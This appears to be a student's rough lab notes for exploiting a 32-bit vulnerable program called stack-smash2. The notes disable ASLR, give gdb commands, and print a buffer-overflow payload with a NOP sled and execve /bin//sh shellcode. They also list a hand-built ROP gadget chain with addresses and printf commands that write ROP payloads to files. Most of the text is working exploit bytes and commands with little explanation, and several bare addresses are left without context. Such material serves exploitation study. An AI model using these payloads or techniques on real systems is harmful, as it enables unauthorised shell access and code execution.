Firstly, run this:
sudo sysctl -w kernel.randomize_va_space=0


RUN GDB IN SUDO MODE
Run this:
./stack-smash2 `cat input-file.txt | xargs printf`

Change the first address after the As (ffffca8c) according to what you want just a random address after the return address.
The program you want to run is the last instructions, the others (0x90) are just nops


`printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x48\xd2\xff\xffAAAAAAAA\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"`

GDB:
gdb <program>
b authenticate_root
r `cat input-file.txt | xargs printf`

ni
x/32x $ebp-32


System calls for intel 32 bit:
https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit



DATA SEGMENT ADDRESS: 
\x24\xa0\x04\x08

0x804b158
0x804b1a8
0x804b2c8




0x080488e1

JUMP 0x08048929

\x60\xb1\x04\x08\x2f\x62\x69\x6e\x48\xb2\x04\x08\x66\xb1\x04\x08\x60\xb1\x04\x08\x2f\x2f\x73\x68\x4c\xb2\x04\x08\x66\xb1\x04\x08\x60\xb1\x04\x08AAAA\x48\xb2\x04\x08\x6c\xb1\x04\x08\x6f\xb1\x04\x08\x72\xb1\x04\x08\x75\xb1\x04\x08

1 \x60\xb1\x04\x08

   0x804b160:   pop    %eax
   0x804b161:   pop    %ebx
   0x804b162:   ret    

2 \x63\xb1\x04\x08

   0x804b163:   xor    %eax,%eax
   0x804b165:   ret    

3 \x66\xb1\x04\x08

   0x804b166:   mov    %eax,(%ebx)
   0x804b168:   ret  

4 \x69\xb1\x04\x08

   0x804b169:   mov    %eax,%ebx
   0x804b16b:   ret 

5  \x6c\xb1\x04\x08

   0x804b16c:   xor    %ecx,%ecx
   0x804b16e:   ret    

6 \x6f\xb1\x04\x08
   0x804b16f:   xor    %edx,%edx
   0x804b171:   ret  

7 \x72\xb1\x04\x08

   0x804b172:   mov    $0xb,%al
   0x804b174:   ret    

8 \x75\xb1\x04\x08

   0x804b175:   int    $0x80
   0x804b177:   ret    

printf "114 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x85\x83\x04\x07\x2f\x62\x69\x6e\x04\xb1\x04\x08\x8b\x83\x04\x07\x85\x83\x04\x07\x2f\x2f\x73\x68\x08\xb1\x04\x08\x8b\x83\x04\x07\x85\x83\x04\x07AAAA\x04\xb1\x04\x08\x88\x83\x04\x07\x91\x83\x04\x07\x94\x83\x04\x07\x97\x83\x04\x07\x9a\x83\x04\x07" > file.3

printf "114 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x85\x83\x04\x07\x2f\x62\x69\x6e\x04\xf0\xfd\xbf\x8b\x83\x04\x07\x85\x83\x04\x07\x2f\x2f\x73\x68\x08\xf0\xfd\xbf\x8b\x83\x04\x07\x85\x83\x04\x07AAAA\x04\xf0\xfd\xbf\x88\x83\x04\x07\x91\x83\x04\x07\x94\x83\x04\x07\x97\x83\x04\x07\x9a\x83\x04\x07" > file.4

0x80632e0

0x80642f0

0x8063160 *****




0x08048929




0x7048380





   0x7048385:   pop    %eax
   0x7048386:   pop    %ebx
   0x7048387:   ret    
   0x7048388:   xor    %eax,%eax
   0x704838a:   ret    
   0x704838b:   mov    %eax,(%ebx)
   0x704838d:   ret    
   0x704838e:   mov    %eax,%ebx
   0x7048390:   ret    
   0x7048391:   xor    %ecx,%ecx
   0x7048393:   ret    
   0x7048394:   xor    %edx,%edx
   0x7048396:   ret    
   0x7048397:   mov    $0xb,%al
   0x7048399:   ret    
   0x704839a:   int    $0x80
   0x704839c:   ret    





0x7048380